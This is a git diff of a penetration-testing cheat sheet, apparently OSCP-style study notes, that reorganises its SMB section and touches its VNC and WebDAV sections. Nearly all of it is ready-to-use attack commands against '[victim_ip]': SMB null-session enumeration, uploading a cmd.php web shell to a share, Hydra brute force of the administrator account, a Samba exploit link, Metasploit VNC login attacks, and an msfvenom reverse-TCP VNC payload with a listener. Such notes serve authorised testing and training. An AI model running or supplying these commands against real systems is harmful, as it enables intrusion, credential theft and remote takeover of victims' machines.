@@ -30,6 +30,15 @@
 - [SMTP](#SMTP)
 - [POP3](POP3)
 - [SMB](#SMB)
+  - [nmap scipt](#nmap)
+  - [rpcclient](#rpcclient)
+  - [smbmap](#smbmap)
+    - [smb_file_upload](#smb_file_upload)
+  - [enum4linux](#enum4linux)
+  - [msfconsole smb payloads](#msfconsole)
+  - [null Session](#null_session)
+  - [Hydra bruteforce](#Bruteforce)
+  - [SMB perl script](#SMB_perl_script)
 - [Redis](#Redis)
 - [VNC](#VNC)
   - [VNC nmap scan](#VNC_nmap)
@@ -522,8 +531,7 @@ telnet [victim_ip] [pop3_port]
 # SMB:
   It's protocol for sharing files and resources. Runs on port 445 or on port 139
   
-##### nmap:
-- ls -la /usr/share/nmap/scripts/smb*
+## :
 - nmap -v -p 139,445 --script=smb-os-discovery [victim_ip]
 - nmap -v -sSVC -p 139,445 --script discovery [victim_ip]
 - nmap --script smb-enum-shares -p 139,445 [victim_ip]
@@ -531,16 +539,16 @@ telnet [victim_ip] [pop3_port]
 - nmap -p 445 -vv --script=smb-enum-shares.nse,smb-enum-users.nse [victim_ip]
 - nmap -sV -p 139,445 --script=smb-vuln-* --script-args=unsafe=1 [victim_ip]
 
-#### rpcclient
+## rpcclient
 - rpcclient -U "" -N [victim_ip]
 ```
   -U "" - null session
   -N - no password
 ```
-#### NetBIOS Service
+## NetBIOS_Service
 - nbtscan -r [victim_ip]
 
-##### smbmap
+## smbmap
   - smbmap -H <victim_ip>
   - smbmap -H <victim_ip> -R
   - smbmap -H <victim_ip> -u anonymous -d <directory>
@@ -549,20 +557,20 @@ telnet [victim_ip] [pop3_port]
   ***R***: recursive, go through each directory and oyt the files
   ***U***: username
   
-#### smbclinet
+## smbclinet
 ```
   - smbclient \\\\[victim_ip]\\[sharename]
   - smbclient -N -L \\\\\[victim_ip]
   - smbclient -N -L //[victim_ip]/directory
   - smbclient //[victim_ip]/"[victim_folder]" -m NT1 --option="client min protocol=NT1"
  ```
- 
- #### smbclinet upload file
+
+### smbclinet_file_upload
 ```
 smbclient -N //<victim_ip>/<folder> -c 'put cmd.php cmd.php'
 ```
  
-#### enum4linux
+## enum4linux
   - Share Enumeration:
     - enum4linux-S [victim_ip]
   - Usernames Enumeration:
@@ -572,54 +580,22 @@ smbclient -N //<victim_ip>/<folder> -c 'put cmd.php cmd.php'
   - enum4linux -a  [victim_ip]
   - enum4linux -u 'guest' -p '' -a  [victim_ip]
     
-#### msfconsole
-  - setg rhosts 192.168.55.248
+## msfconsole
+  - set rhosts 192.168.55.248
   - use auxiliary/scanner/smb/smb_enumusers
     - run
   - use auxiliary/scanner/smb/smb_enumshares
     - run
   - use auxiliary/scanner/smb/smb_version
-    - run
-##### create a resource file
-```
-  echo 'setg rhosts 192.168.55.248' > smbscan.rc
-  echo 'use auxiliary/scanner/smb/smb_enumusers' >> smbscan.rc
-  echo 'run' >> smbscan.rc
-  echo 'use auxiliary/scanner/smb/smb_enumshares' >> smbscan.rc
-  echo 'run' >> smbscan.rc
-  echo 'use auxiliary/scanner/smb/smb_version' >> smbscan.rc
-  echo 'run' >> smbscan.rc
-  
-  msfconsole -r smbscan.rc
-```
-  
-#### Manual Inspection
-```
-if [ -z $1 ]; then echo "Usage: ./smbver.sh RHOST {RPORT}" && exit; else rhost=$1; fi
-if [ ! -z $2 ]; then rport=$2; else rport=139; fi
-tcpdump -s0 -n -i tap0 src $rhost and port $rport -A -c 7 2>/dev/null | grep -i "samba\|s.a.m" | tr -d '.' | grep -oP 'UnixSamba.*[0-9a-z]' | tr -d '\n' & echo -n "$rhost: " &
-echo "exit" | smbclient -L $rhost 1>/dev/null 2>/dev/null
-sleep 0.5 && echo ""
-```
-usage: ./script.sh [victim_ip]
 
-#### Checklist
-- Enumerate hostname: nmblookup -A [victim_ip]
-- List shares
-  - smbmap -H [victim_ip]
-  - echo exit | smbclient -L \\\\[victim_ip]
-  - nmap --script smb-enum-shares -p 139,445 [victim_ip]
-- Check Null Sessions
-  - smbmap -H [victim_ip]
-  - rpcclient -U "" -N [victim_ip]
-  - smbclient \\\\[victim_ip]\\[share name]
-- Check for Vulnerabilities
-  - nmap --script smb-vuln* -p 139,445 [victim_ip]
-- Overall Scan: enum4linux -a [victim_ip]
+## null_session
+- null session and extract information
+- nbtscan -r [victim_ip]
 
-#### Samba version checker 
-- (bash script)
+## Bruteforce
+- hydra -l administrator -P /usr/share/wordlists/rockyou.txt -t 1 [victim_ip] smb
 
+## Smb_version_checker 
 ```
 #!/bin/sh
 #Author: rewardone
@@ -636,22 +612,10 @@ tcpdump -s0 -n -i tap0 src $rhost and port $rport -A -c 7 2>/dev/null | grep -i 
 echo "exit" | smbclient -L $rhost 1>/dev/null 2>/dev/null
 echo "" && sleep .1
 ```
-- nmblookup -A [victim_ip]
 
-- enum4linux -a [victim_ip]
-
-### Null Session
-- null session and extract information
-- nbtscan -r [victim_ip]
-
-### Bruteforce
-- hydra -l administrator -P /usr/share/wordlists/rockyou.txt -t 1 [victim_ip] smb
-
-### SMB 7.pl (usefull script)
+## SMB_perl_script
 - https://github.com/offensive-security/exploitdb/blob/master/exploits/linux/remote/7.pl
 
-### references
-- https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html#nmap
 -------------------------------------------------------------------------------------------------------------------------------------
 # Redis:
 Data structure store, used as a database, cache and message broker. It supports data structures such as strings, hashes, lists, sets, sorted sets with range queries, bitmaps, hyperloglogs, geospatial indexes with radius queries and streams
@@ -735,31 +699,31 @@ https://www.exploit-db.com/exploits/36932
 ```
 ## MSF_VNC_auth_none
 ```
-msf > use auxiliary/scanner/vnc/vnc_none_auth
-msf > set RHOSTS [target_ip]
-msf > set THREADS [int]
-msf > run
+  msf > use auxiliary/scanner/vnc/vnc_none_auth
+  msf > set RHOSTS [target_ip]
+  msf > set THREADS [int]
+  msf > run
 ```
 
 ## MSF_VNC_password_attack
 ```
-msf > use auxiliary/scanner/vnc/vnc_login
-msf > set rhosts [victim_ip]
-msf > set rport [victim_ip
-msf > set pass_file /your/dictionary/file
-msf > run
+  msf > use auxiliary/scanner/vnc/vnc_login
+  msf > set rhosts [victim_ip]
+  msf > set rport [victim_ip
+  msf > set pass_file /your/dictionary/file
+  msf > run
 ```
 
 ## MSFVenom_VNC_payload
 ```
 msfvenom -p windows/vncinject/reverse_tcp lhost=[your_ip] lport=[your_port] -f exe > /var/www/html/vnc.exe
 
-msf > use exploit/multi/handler
-msf > set payload/widnows/vncinject/reverse_tcp
-msf > set lport [your_ip]
-msf > set lport [your_port]
-msf > set viewonly false
-msf > run
+  msf > use exploit/multi/handler
+  msf > set payload/widnows/vncinject/reverse_tcp 
+  msf > set lport [your_ip]
+  msf > set lport [your_port]
+  msf > set viewonly false
+  msf > run
 ```
 
 ## VNC_post_exploitation
@@ -782,9 +746,9 @@ davtest -move -senddb auto -url http://[victim_ip]:[victim_port]
 ```
 ## metasploit
 ```
-use auxiliary/scanner/http/webdav_scanner
-use auxiliary/scanner/http/webdav_internal_ip
-use auxiliary/scanner/http/webdav_website_content
+  use auxiliary/scanner/http/webdav_scanner
+  use auxiliary/scanner/http/webdav_internal_ip
+  use auxiliary/scanner/http/webdav_website_content
 ```
 ## webdav_via_curl
 ```
